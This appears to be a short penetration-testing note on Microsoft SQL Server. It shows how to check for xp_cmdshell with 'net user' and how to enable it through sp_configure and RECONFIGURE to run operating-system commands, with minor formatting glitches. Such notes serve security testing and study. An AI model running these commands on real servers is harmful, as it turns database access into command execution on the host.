# SQLi

After successfully authenticating to a SQL Server \
It is worth a shot to verify if xp\_cmdshell has been previously activated with:\


```
EXEC xp_cmdshell 'net user';
```

``

If xp\_cmdshell has not been activated, run the below commands to activate and utilize Windows XP cmd commands within SQL:

<pre><code># The command below enables sp_configure 

<strong>EXEC sp_configure 'show advanced options', 1;</strong></code></pre>

```
RECONFIGURE; sp_configure; 
```

```
message EXEC sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```
